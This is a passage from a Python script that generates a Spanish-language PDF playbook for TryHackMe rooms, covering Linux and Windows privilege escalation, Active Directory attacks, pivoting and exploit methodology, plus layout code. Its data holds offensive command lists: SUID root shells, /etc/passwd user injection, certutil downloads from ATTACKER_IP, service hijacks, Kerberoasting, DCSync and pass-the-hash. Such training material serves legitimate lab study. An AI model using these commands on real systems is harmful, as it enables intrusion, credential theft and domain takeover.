                "/usr/bin/find . -exec /bin/sh -p \\; -quit",
                "cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
            ]),
            ("h2", "Capabilities"),
            ("code", [
                "getcap -r / 2>/dev/null",
                "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                "/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'",
            ]),
            ("h2", "Cron / tareas"),
            ("code", [
                "cat /etc/crontab; ls -la /etc/cron.*",
                "echo 'chmod +s /bin/bash' >> script_escribible.sh",
                "touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh'",
            ]),
            ("h2", "Ficheros escribibles"),
            ("code", [
                "ls -la /etc/passwd /etc/shadow",
                "openssl passwd -1 -salt hax pass123",
                "echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t",
            ]),
            ("h2", "NFS no_root_squash"),
            ("code", [
                "cat /etc/exports",
                "showmount -e $IP",
                "sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash",
            ]),
            ("h2", "Kernel / version"),
            ("code", [
                "uname -a; cat /etc/os-release",
                "searchsploit linux kernel <version>",
            ]),
            ("h2", "Contenedores (docker / lxd)"),
            ("code", [
                "id",
                "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "lxc image import ./alpine.tar.gz --alias privesc",
                "lxc init privesc r00t -c security.privileged=true",
                "lxc config device add r00t host disk source=/ path=/mnt/root recursive=true",
                "lxc start r00t && lxc exec r00t /bin/sh",
            ]),
            ("table", [
                ["Vector", "Que mirar"],
                ["sudo", "NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas."],
                ["SUID/SGID", "bash, find, vim, less, cp, tar, zip, python, perl, nmap, env."],
                ["Capabilities", "cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin."],
                ["Cron/timers", "Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root."],
                ["Credenciales", "Configs, backups, /var/www, .ssh, history, DB dumps."],
                ["Contenedores", "docker/lxd/lxc groups, docker.sock, montajes privilegiados."],
            ], [3.2 * cm, 13.0 * cm]),
        ],
    },
    {
        "title": "10. Windows local privilege escalation",
        "short": "Windows privesc",
        "summary": "Post-exploit Windows fuera de AD.",
        "blocks": [
            ("h2", "Enumeracion inicial"),
            ("code", [
                "whoami",
                "whoami /groups",
                "whoami /priv",
                "whoami /user",
                "hostname",
                "echo %USERNAME%",
                "echo %USERDOMAIN%",
                "ver",
                "systeminfo",
                "wmic os get Caption,Version,BuildNumber,OSArchitecture",
                "wmic qfe get Caption,Description,HotFixID,InstalledOn",
                "wmic product get name,version 2>nul",
            ]),
            ("h2", "Automatizado (winPEAS)"),
            ("code", [
                "powershell -NoProfile -ExecutionPolicy Bypass",
                "certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe",
                "powershell -c \"iwr http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\"",
                "C:\\Windows\\Temp\\winpeas.exe",
            ]),
            ("h2", "Servicios debiles"),
            ("code", [
                "sc query state= all",
                "wmic service get name,displayname,pathname,startmode",
                "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\"",
                "sc qc SERVICIO",
                "accesschk.exe -uwcqv \"Authenticated Users\" *",
                "accesschk.exe -uwcqv %USERNAME% SERVICIO",
                "sc config SERVICIO binPath= \"cmd /c C:\\Windows\\Temp\\shell.exe\"",
                "sc stop SERVICIO",
                "sc start SERVICIO",
            ]),
            ("h2", "Unquoted service path"),
            ("code", [
                "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\" | findstr /i /v '\"'",
                "dir \"C:\\Program Files\"",
                "dir \"C:\\Program Files (x86)\"",
                "icacls \"C:\\Program Files\"",
                "icacls \"C:\\Program Files\\Vendor App\"",
            ]),
            ("h2", "Tareas programadas"),
            ("code", [
                "schtasks /query /fo LIST /v",
                "dir C:\\Windows\\Tasks",
                "dir C:\\Windows\\System32\\Tasks /s /b",
            ]),
            ("h2", "Registro / autoruns"),
            ("code", [
                "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ]),
            ("h2", "AlwaysInstallElevated"),
            ("code", [
                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "msiexec /quiet /qn /i C:\\Windows\\Temp\\payload.msi",
            ]),
            ("h2", "Credenciales"),
            ("code", [
                "cmdkey /list",
                "dir /s /b *pass* *cred* *config* *backup* 2>nul",
                "findstr /si password *.txt *.ini *.config *.xml 2>nul",
                "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
                "type C:\\Windows\\Panther\\Unattended.xml 2>nul",
                "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul",
            ]),
            ("h2", "Token / SeImpersonate (potato)"),
            ("code", [
                "certutil -urlcache -split -f http://ATTACKER_IP:8000/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe",
                "C:\\Windows\\Temp\\ps.exe -i -c \"C:\\Windows\\Temp\\shell.exe\"",
                "C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\"",
                "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\shell.exe -t *",
            ]),
            ("table", [
                ["Vector", "Senal"],
                ["Servicios debiles", "Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable."],
                ["Unquoted service path", "Ruta con espacios sin comillas y directorio intermedio escribible."],
                ["AlwaysInstallElevated", "HKCU y HKLM Installer AlwaysInstallElevated a 1."],
                ["Tareas programadas", "Script/binario ejecutado por usuario superior en ruta escribible."],
                ["SeImpersonatePrivilege", "Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab."],
                ["SeBackupPrivilege", "Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles."],
                ["Credenciales", "IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey."],
            ], [4.0 * cm, 12.2 * cm]),
        ],
    },
    {
        "title": "11. Active Directory",
        "short": "Active Directory",
        "summary": "Workflow de dominio: usuarios, credenciales, Kerberos, BloodHound y movimiento.",
        "blocks": [
            ("p", "En AD el enfoque cambia: no es solo explotar una maquina, sino transformar identidad y permisos en movimiento."),
            ("code", [
                "export DOMAIN=dominio.local",
                "export DC_HOST=DC01",
                "export DC_FQDN=dc01.dominio.local",
                "echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts",
                "nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 $IP",
                "nxc smb $IP",
                "smbclient -L //$IP -N",
                "nxc smb $IP -u 'Guest' -p '' --shares",
                "nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt",
            ]),
            ("h2", "Usuarios del dominio"),
            ("code", [
                "nxc smb $IP -u 'guest' -p '' --rid-brute | tee rid.txt",
                "impacket-lookupsid $DOMAIN/guest@$IP -no-pass",
                "ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' '(objectClass=user)' sAMAccountName",
                "kerbrute userenum -d $DOMAIN --dc $DC_FQDN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
            ]),
            ("h2", "Password spraying"),
            ("code", [
                "nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success",
                "nxc smb $IP -u users.txt -p users.txt --no-bruteforce --continue-on-success",
                "kerbrute passwordspray -d $DOMAIN --dc $DC_FQDN users.txt 'Password1!'",
            ]),
            ("h2", "AS-REP Roasting (sin preauth)"),
            ("code", [
                "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP",
                "impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $IP -outputfile asrep.hash",
                "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
            ]),
            ("h2", "Kerberoasting (cuentas con SPN)"),
            ("code", [
                "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.hash",
                "nxc ldap $IP -u $USER -p $PASS --kerberoasting kerb.hash",
                "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
            ]),
            ("h2", "BloodHound"),
            ("code", [
                "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip",
                "nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All --dns-server $IP",
            ]),
            ("h2", "Dump de credenciales / DCSync"),
            ("code", [
                "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP",
                "impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC_FQDN",
                "nxc smb $IP -u $USER -p $PASS --sam --lsa --ntds",
            ]),
            ("h2", "Pass-the-Hash y tickets"),
            ("code", [
                "nxc smb $IP -u $USER -H <NTLM>",
                "impacket-psexec $DOMAIN/$USER@$IP -hashes :<NTLM>",
                "impacket-getTGT $DOMAIN/$USER:$PASS -dc-ip $IP",
                "export KRB5CCNAME=$USER.ccache; impacket-psexec -k -no-pass $DOMAIN/$USER@$DC_FQDN",
            ]),
            ("h2", "Acceso y shell"),
            ("code", [
                "evil-winrm -i $IP -u $USER -p $PASS",
                "evil-winrm -i $IP -u $USER -H <NTLM>",
                "impacket-wmiexec $DOMAIN/$USER:$PASS@$IP",
                "impacket-smbexec $DOMAIN/$USER:$PASS@$IP",
            ]),
            ("h2", "ADCS (certipy)"),
            ("code", [
                "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $IP -vulnerable -stdout",
                "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $IP -ca <CA> -template <TEMPLATE> -upn administrator@$DOMAIN",
                "certipy auth -pfx administrator.pfx -dc-ip $IP",
            ]),
            ("table", [
                ["Fase", "Objetivo"],
                ["Identificar dominio", "DC, FQDN, realm, clock skew y /etc/hosts correcto."],
                ["Usuarios reales", "RID brute, LDAP, shares, naming patterns."],
                ["Credenciales", "Spraying controlado, usuario=password, leaks en shares."],
                ["Reenumerar", "Cada credencial nueva cambia shares, LDAP, WinRM y permisos."],
                ["Kerberos", "AS-REP roasting, Kerberoasting, tickets, errores de hora."],
                ["BloodHound", "Rutas de ACL, sesiones, grupos, GenericAll/WriteDacl/ForceChangePassword."],
                ["Acceso", "WinRM, SMB exec, RDP o movimiento lateral segun permisos."],
            ], [3.2 * cm, 13.0 * cm]),
        ],
    },
    {
        "title": "12. Pivoting y redes internas",
        "short": "Pivoting",
        "summary": "Cuando el target ve servicios que tu Kali no ve.",
        "blocks": [
            ("table", [
                ["Situacion", "Tecnica"],
                ["Tengo SSH al pivot", "ssh -L para servicio concreto, ssh -D para SOCKS."],
                ["No tengo SSH pero ejecuto binarios", "chisel reverse o ligolo-ng."],
                ["Necesito escanear varios hosts", "ligolo-ng con interfaz tun y rutas."],
                ["Solo necesito una web interna", "Forward local especifico."],
                ["Hostnames internos", "Resolver DNS interno o anadir /etc/hosts."],
            ], [4.0 * cm, 12.2 * cm]),
            ("h2", "Enumerar la red interna"),
            ("code", [
                "ip a",
                "ip route",
                "ss -tulpen",
                "netstat -ano",
                "hostname -I",
                "cat /etc/hosts",
                "arp -a",
            ]),
            ("h2", "SSH port forwarding"),
            ("code", [
                "ssh -L 8080:127.0.0.1:80 user@$IP",
                "ssh -D 1080 -N user@$IP",
                "ssh -R 9001:127.0.0.1:9001 user@ATTACKER_IP",
                "curl http://127.0.0.1:8080",
            ]),
            ("h2", "Chisel (reverse SOCKS)"),
            ("code", [
                "chisel server -p 8000 --reverse",
                "./chisel client ATTACKER_IP:8000 R:socks",
                "./chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:80",
            ]),
            ("h2", "Ligolo-ng"),
            ("code", [
                "sudo ip tuntap add user $USER mode tun ligolo",
                "sudo ip link set ligolo up",
                "./proxy -selfcert -laddr 0.0.0.0:11601",
                "./agent -connect ATTACKER_IP:11601 -ignore-cert",
                "session",
                "start",
                "sudo ip route add 10.10.20.0/24 dev ligolo",
                "nmap -Pn -sT -p80,445 10.10.20.5",
            ]),
            ("h2", "Proxychains"),
            ("code", [
                "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf",
                "proxychains curl http://10.10.20.5/",
                "proxychains nmap -sT -Pn -p80,445 10.10.20.5",
                "proxychains nmap -sT -Pn -n -p80,445 10.10.20.5",
                "proxychains crackmapexec smb 10.10.20.5 -u USER -p PASS",
            ]),
            ("h2", "DNS interno"),
            ("code", [
                "cat /etc/resolv.conf",
                "nslookup intranet.local DNS_INTERNO",
                "dig @DNS_INTERNO intranet.local",
                "echo '10.10.20.5 intranet.local' | sudo tee -a /etc/hosts",
            ]),
            ("bullets", [
                "Valida con curl/nc antes de escanear.",
                "Con proxychains usa -sT, no SYN scan.",
                "Documenta atacante -> pivot -> red interna -> servicio.",
            ]),
        ],
    },
    {
        "title": "13. Metodologia CVE y exploits",
        "short": "CVE y exploits",
        "summary": "Usar PoCs sin ejecutar basura a ciegas.",
        "blocks": [
            ("table", [
                ["Pregunta", "Decision"],
                ["Coincide producto exacto?", "Si no, baja prioridad."],
                ["Coincide rango de version?", "Si esta fuera, descarta o busca config concreta."],
                ["Requiere credenciales?", "Separar pre-auth de post-auth."],
                ["Requiere admin?", "Solo sirve si ya tienes ese rol."],
                ["Es destructivo?", "Evitar DoS/wipers salvo que el lab lo pida claramente."],
            ], [4.2 * cm, 12.0 * cm]),
            ("code", [
                "searchsploit PRODUCT VERSION",
                "sed -n '1,220p' exploit.py",
                "grep -nEi 'rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess' exploit.py",
                "python3 exploit.py -h",
                "python3 exploit.py --check --url $URL",
            ]),
            ("bullets", [
                "Primero reproduce la peticion minima con curl/Burp.",
                "Cambia payloads por comandos inocuos: id, whoami, hostname.",
                "Guarda fuente, version detectada, cambios hechos y output de exito.",
            ]),
        ],
    },
    {
        "title": "Errores tipicos y soluciones",
        "short": "Errores tipicos",
        "summary": "Problemas frecuentes en THM y como desbloquearlos rapido.",
        "blocks": [
            ("p", "Cuando algo falla, primero distingue si el problema es de conectividad, nombre/dominio, autenticacion, herramienta o interpretacion del resultado. Esta tabla es para salir del bucle rapido."),
            ("table", [
                ["Sintoma", "Causa probable", "Que probar"],
                ["No responde ping", "ICMP filtrado o VPN rara.", "Usar nmap -Pn; comprobar tun0/VPN; reiniciar target si THM va lento."],
                ["nmap ve pocos puertos", "Rate alto, host filtrando o escaneo incompleto.", "Repetir con -Pn, bajar --min-rate, probar top ports UDP si aplica."],
                ["ffuf devuelve todo 200", "Wildcard o pagina catch-all.", "Filtrar con -fs, -fw, -fl; comparar una ruta aleatoria inexistente."],
                ["vhost no aparece", "Host header incorrecto o falta /etc/hosts.", "Anadir dominio a /etc/hosts; usar -H 'Host: FUZZ.dominio'."],
                ["Reverse shell no llega", "LHOST mal, VPN IP incorrecta, firewall o puerto ocupado.", "Usar ip a/tun0; nc -lvnp; probar curl desde victima a tu HTTP."],
                ["Shell se corta", "TTY inestable o comando interactivo.", "Estabilizar con python pty, stty raw -echo, TERM=xterm."],
                ["smbclient ACCESS_DENIED", "Formato de usuario/dominio o permisos insuficientes.", "Probar -N, Guest, DOMAIN/user, user%pass, smbmap y nxc."],
                ["Kerberos KRB_AP_ERR_SKEW", "Hora desincronizada.", "Sincronizar hora con DC; comprobar timezone; usar FQDN correcto."],
                ["Cannot find KDC", "DNS/hosts/realm mal.", "Anadir DC_FQDN y dominio a /etc/hosts; revisar DOMAIN en mayus/minus."],
                ["evil-winrm falla", "Puerto cerrado, formato usuario o cred invalida.", "nxc winrm $IP -u USER -p PASS; probar DOMAIN\\USER; revisar 5985/5986."],
                ["SQLMap no detecta nada", "Request incompleta, parametro no vulnerable o WAF/filtro.", "Usar -r desde Burp, marcar parametro con *, subir level/risk con cuidado."],
                ["PoC no funciona", "Version/config no coincide o requiere auth.", "Leer PoC, confirmar precondiciones, reproducir peticion minima con curl/Burp."],
            ], [4.2 * cm, 4.8 * cm, 7.2 * cm]),
            ("h2", "Regla de oro"),
            ("bullets", [
                "Si una herramienta falla, reproduce la condicion minima con curl, nc, smbclient o nxc.",
                "Si un servicio depende de nombre, no insistas solo con IP.",
                "Si una credencial funciona en un sitio, pruebala de forma controlada en los demas servicios.",
            ]),
        ],
    },
    {
        "title": "Me he atascado",
        "short": "Checklist de atasco",
        "summary": "Preguntas para cuando llevas rato sin avanzar.",
        "blocks": [
            ("p", "No es una lista para hacer siempre; es una lista de rescate. Si estas atascado, vuelve a lo basico y busca una superficie que no hayas reenumerado con la informacion nueva."),
            ("table", [
                ["Pregunta", "Por que puede desbloquear"],
                ["He revisado UDP?", "DNS, SNMP, TFTP o NFS suelen cambiar completamente la room."],
                ["He probado vhosts?", "Muchas webs esconden paneles o apps por Host header."],
                ["He mirado robots, sitemap, JS y codigo fuente?", "Puede filtrar rutas, endpoints, tokens o comentarios."],
                ["Tengo usuarios reales?", "Usuarios reales permiten spraying, AS-REP, Kerberoast o cred reuse."],
                ["He reenumerado con nuevas credenciales?", "Una cred valida cambia shares, LDAP, web, sudo, WinRM y DB."],
                ["Hay servicios solo en localhost?", "Puede requerir pivot o port forward tras conseguir shell."],
                ["He probado cred reuse?", "La misma password puede abrir SSH, SMB, WinRM, panel web, MySQL o sudo."],
                ["Estoy usando hostname cuando toca?", "Kerberos, vhosts y apps internas pueden fallar solo por usar IP."],
                ["He revisado permisos de escritura?", "Privesc suele venir de scripts, servicios, cron/tareas o configs escribibles."],
                ["Estoy siguiendo un falso positivo?", "Vuelve a evidencia: version exacta, respuesta real e impacto claro."],
            ], [5.2 * cm, 11.0 * cm]),
            ("h2", "Reset de 10 minutos"),
            ("code", [
                "cat nmap/services.txt",
                "grep -RniE 'pass|user|key|token|admin' loot web notes 2>/dev/null",
                "cat notes/creds.md 2>/dev/null",
                "cat notes/timeline.md 2>/dev/null",
            ]),
            ("bullets", [
                "Escribe en una linea cual es tu mejor hipotesis actual.",
                "Escribe que evidencia la apoya y que prueba la descartaria.",
                "Si no puedes responder eso, vuelve a enumeracion, no a exploits.",
            ]),
        ],
    },
    {
        "title": "14. Notas, writeup y cierre",
        "short": "Notas y cierre",
        "summary": "Que registrar para no perderte y poder repetir la cadena.",
        "blocks": [
            ("h2", "Plantilla minima"),
            ("code", [
                "# Room",
                "- IP:",
                "- Hostnames:",
                "- Dominio:",
                "- Puertos:",
                "- Credenciales:",
                "- Hallazgo clave:",
                "- Acceso inicial:",
                "- Escalada:",
                "- Flags:",
                "- Root cause:",
            ]),
            ("table", [
                ["Registro", "Contenido"],
                ["Superficie", "Puerto, servicio, version, evidencia y siguiente prueba."],
                ["Comando", "Contexto, comando, resultado importante y decision desbloqueada."],
                ["Credenciales", "Usuario, password/hash, fuente, servicio probado y resultado."],
                ["Hallazgo", "Impacto, precondiciones, pasos reproducibles, evidencia y mitigacion teorica."],
                ["Cierre", "Comandos minimos para reproducir user/root y falsos caminos relevantes."],
            ], [3.2 * cm, 13.0 * cm]),
        ],
    },
    {
        "title": "15. Equivalencias Windows/Linux",
        "short": "Equivalencias",
        "summary": "Traduccion rapida de comandos entre Linux, CMD y PowerShell.",
        "blocks": [
            ("table", [
                ["Objetivo", "Linux", "CMD", "PowerShell"],
                ["Listar", "ls -la", "dir", "Get-ChildItem / ls"],
                ["Ver archivo", "cat file", "type file", "Get-Content file"],
                ["Copiar", "cp a b", "copy a b", "Copy-Item a b"],
                ["Mover", "mv a b", "move a b", "Move-Item a b"],
                ["Borrar", "rm file", "del file", "Remove-Item file"],
                ["Buscar texto", "grep -R pass .", "findstr /S /I pass *", "Select-String -Pattern pass -Recurse"],
                ["Buscar archivo", "find / -name file", "dir /s /b file", "Get-ChildItem -Recurse -Filter file"],
                ["Procesos", "ps aux", "tasklist", "Get-Process"],
                ["Red", "ip a", "ipconfig /all", "Get-NetIPConfiguration"],
                ["Puertos", "ss -tulpen", "netstat -ano", "Get-NetTCPConnection"],
                ["Descargar", "wget/curl", "certutil -urlcache -split -f", "Invoke-WebRequest -OutFile"],
                ["Hash", "sha256sum file", "certutil -hashfile file SHA256", "Get-FileHash file"],
            ], [3.3 * cm, 4.3 * cm, 4.0 * cm, 4.6 * cm]),
            ("bullets", [
                "PowerShell acepta alias como ls, cat, cp, mv y rm, pero no siempre se comportan igual que Bash.",
                "En writeups usa comandos nativos claros cuando quieras reproducibilidad.",
                "En Windows, rutas con espacios necesitan comillas.",
            ]),
        ],
    },
]


def build_section_pdf(section, index):
    path = TMP_DIR / f"section_{index:02d}.pdf"
    story = [p(f"{index}. {section['short']}", "H1X"), p(section["summary"], "SmallX"), Spacer(1, 0.15 * cm)]
    for block in section["blocks"]:
        kind = block[0]
        if kind == "p":
            story.append(p(block[1]))
        elif kind == "h2":
            story.append(p(block[1], "H2X"))
        elif kind == "bullets":
            story.extend(bullets(block[1]))
        elif kind == "code":
            story.append(code(block[1]))
        elif kind == "table":
            widths = block[2] if len(block) > 2 else None
            story.append(table(block[1], widths))
            story.append(Spacer(1, 0.15 * cm))
        elif kind == "pagebreak":
            story.append(PageBreak())
    SimpleDocTemplate(
        str(path),
        pagesize=A4,
        rightMargin=1.45 * cm,
        leftMargin=1.45 * cm,
        topMargin=1.35 * cm,
        bottomMargin=1.55 * cm,
        title=section["short"],
    ).build(story, onFirstPage=on_page, onLaterPages=on_page)
    return path


def wrap_lines(text, font, size, width, max_lines=2):
    words = norm(text).split()
    lines = []
    current = ""
    for word in words:
        candidate = word if not current else current + " " + word
        if stringWidth(candidate, font, size) <= width:
            current = candidate
        else:
            if current:
                lines.append(current)
                current = word
            else:
                lines.append(word)
                current = ""
        if len(lines) >= max_lines:
            break
    if current and len(lines) < max_lines:
        lines.append(current)
    return lines[:max_lines]


def draw_wrapped(c, text, x, y, width, font="Helvetica", size=8, leading=9, max_lines=2):
    c.setFont(font, size)
    for idx, line in enumerate(wrap_lines(text, font, size, width, max_lines)):
        c.drawString(x, y - idx * leading, line)


def build_frontmatter(front_pdf, section_pages):
    width, height = A4
    left = 1.45 * cm
    front_pages = 2
    running = front_pages
    starts = {}
    for section, pages in zip(SECTIONS, section_pages):
        starts[section["short"]] = running
        running += pages

    c = canvas.Canvas(str(front_pdf), pagesize=A4)
    c.setTitle("THM Playbook Estructurado")
    c.setFillColor(colors.HexColor("#111827"))
    c.setFont("Helvetica-Bold", 26)
    c.drawCentredString(width / 2, height - 2.4 * cm, "THM Playbook Estructurado")
    c.setFillColor(colors.HexColor("#475467"))
    c.setFont("Helvetica", 11)
    c.drawCentredString(width / 2, height - 3.08 * cm, "Version curada y organizada del master para resolver rooms")
    c.setFillColor(colors.HexColor("#1f2937"))
    draw_wrapped(
        c,
        "Este documento filtra y reordena el contenido del master como una guia unica. Pulsa una fila del indice para saltar a la seccion.",
        left,
        height - 4.05 * cm,
        width - 2.9 * cm,
        "Helvetica",
        9.2,
        12,
        2,
    )
    c.setFont("Helvetica-Bold", 18)
    c.setFillColor(colors.HexColor("#111827"))
    c.drawString(left, height - 5.0 * cm, "Indice")

    table_x = left
    table_y = height - 5.45 * cm
    col_widths = [1.0 * cm, 6.3 * cm, 1.5 * cm, 7.1 * cm]
    header_h = 0.55 * cm
    row_h = 0.72 * cm
    total_w = sum(col_widths)
    links = []
    c.setFillColor(colors.HexColor("#111827"))
    c.rect(table_x, table_y - header_h, total_w, header_h, fill=1, stroke=0)
    c.setFillColor(colors.white)
    c.setFont("Helvetica-Bold", 7.8)
    for label, offset in zip(["#", "Seccion", "Pagina", "Uso"], [0, col_widths[0], col_widths[0] + col_widths[1], col_widths[0] + col_widths[1] + col_widths[2]]):
        c.drawString(table_x + offset + 5, table_y - 0.36 * cm, label)
    y = table_y - header_h
    c.setStrokeColor(colors.HexColor("#d0d5dd"))
    c.rect(table_x, table_y - header_h - row_h * len(SECTIONS), total_w, header_h + row_h * len(SECTIONS), fill=0, stroke=1)
    for idx, section in enumerate(SECTIONS, 1):
        y_next = y - row_h
        c.setStrokeColor(colors.HexColor("#eaecf0"))
        c.line(table_x, y_next, table_x + total_w, y_next)
        x_line = table_x
        for col_w in col_widths[:-1]:
            x_line += col_w
            c.line(x_line, y, x_line, y_next)
        c.setFillColor(colors.HexColor("#1f2937"))
        c.setFont("Helvetica", 7.6)
        c.drawString(table_x + 5, y - 0.31 * cm, str(idx))
        draw_wrapped(c, section["short"], table_x + col_widths[0] + 5, y - 0.29 * cm, col_widths[1] - 10, "Helvetica-Bold", 7.5, 8, 2)
        c.drawString(table_x + col_widths[0] + col_widths[1] + 5, y - 0.31 * cm, str(starts[section["short"]] + 1))
        draw_wrapped(c, section["summary"], table_x + col_widths[0] + col_widths[1] + col_widths[2] + 5, y - 0.29 * cm, col_widths[3] - 10, "Helvetica", 7.1, 7.8, 2)
        links.append((0, section["short"], (table_x, y_next, table_x + total_w, y)))
        y = y_next
    c.setFillColor(colors.HexColor("#667085"))
    c.setFont("Helvetica", 8)
    c.drawString(left, 1.0 * cm, "THM Playbook Estructurado - indice - pagina 1")
    c.showPage()

    c.setFillColor(colors.HexColor("#111827"))
    c.setFont("Helvetica-Bold", 22)
    c.drawString(left, height - 2.3 * cm, "Como usarlo")
    c.setFillColor(colors.HexColor("#1f2937"))
    use_rows = [
        ("1", "Empieza por Mentalidad y Recon. No saltes a exploits sin saber superficie y nombres.", "Mentalidad y preparacion"),
        ("2", "Usa el mapa de decisiones para elegir rama: web, CMS, SQLi, credenciales, privesc, AD o pivot.", "Mapa de decisiones"),
        ("3", "Si reconoces el patron de la room, salta a arquetipos para escoger ruta de trabajo.", "Arquetipos de rooms"),
        ("4", "Cada credencial nueva reinicia la enumeracion: shares, web, sudo, WinRM, LDAP o DB.", "Credenciales y loot"),
        ("5", "Si consigues shell, cambia de fase: estabilizar, loot, privesc local y solo despues pivot/AD si aplica.", "Acceso inicial"),
        ("6", "Si te atascas, usa la checklist de rescate antes de probar exploits al azar.", "Checklist de atasco"),
    ]
    y = height - 3.1 * cm
    for num, text, target in use_rows:
        c.setFillColor(colors.HexColor("#111827"))
        c.setFont("Helvetica-Bold", 13)
        c.drawString(left, y, num + ".")
        c.setFillColor(colors.HexColor("#1f2937"))
        draw_wrapped(c, text, left + 0.7 * cm, y, width - 3.6 * cm, "Helvetica", 10, 12, 2)
        links.append((1, target, (left, y - 0.25 * cm, width - left, y + 0.35 * cm)))
        y -= 1.0 * cm
    c.setFont("Helvetica-Bold", 17)
    c.setFillColor(colors.HexColor("#111827"))
    c.drawString(left, y - 0.4 * cm, "Principio de trabajo")
    draw_wrapped(
        c,
        "Enumera hasta tener una hipotesis concreta. Explota solo lo que puedas explicar. Documenta solo lo que cambia la decision.",
        left,
        y - 0.9 * cm,
        width - 2.9 * cm,
        "Helvetica",
        10,
        12,
        3,
    )
    c.setFillColor(colors.HexColor("#667085"))
    c.setFont("Helvetica", 8)
    c.drawString(left, 1.0 * cm, "THM Playbook Estructurado - uso - pagina 2")
    c.save()
    return links, starts


def build_structured_playbook():
    width, _ = A4
    section_paths = [build_section_pdf(section, i) for i, section in enumerate(SECTIONS, 1)]
    section_pages = [len(PdfReader(str(path)).pages) for path in section_paths]
    front_pdf = TMP_DIR / "structured_frontmatter.pdf"
    links, starts = build_frontmatter(front_pdf, section_pages)
    output = OUT_DIR / "THM_playbook_estructurado.pdf"

    writer = PdfWriter()
    front_reader = PdfReader(str(front_pdf))
    for page in front_reader.pages:
        writer.add_page(page)
    writer.add_outline_item("Indice", 0)
    target_pages = {}
    current = len(front_reader.pages)
    for section, path in zip(SECTIONS, section_paths):
        target_pages[section["short"]] = current
        writer.add_outline_item(section["short"], current)
        reader = PdfReader(str(path))
        for page in reader.pages:
            writer.add_page(page)
        current += len(reader.pages)
    border = ArrayObject([NumberObject(0), NumberObject(0), NumberObject(0)])
    for front_page, short, rect in links:
        writer.add_annotation(front_page, Link(rect=rect, target_page_index=target_pages[short], border=border))
    back_to_index_rect = (width - 4.7 * cm, 0.72 * cm, width - 1.3 * cm, 1.25 * cm)
    for page_number in range(len(front_reader.pages), len(writer.pages)):
        writer.add_annotation(page_number, Link(rect=back_to_index_rect, target_page_index=0, border=border))
    with output.open("wb") as handle:
        writer.write(handle)
    return output, section_pages


def main():
    output, section_pages = build_structured_playbook()
    reader = PdfReader(str(output))
    print(output)
    print(f"pages={len(reader.pages)}")
    print(f"sections={len(SECTIONS)}")
    for section, pages in zip(SECTIONS, section_pages):
        print(f"{section['short']}: {pages}")


if __name__ == "__main__":
    main()
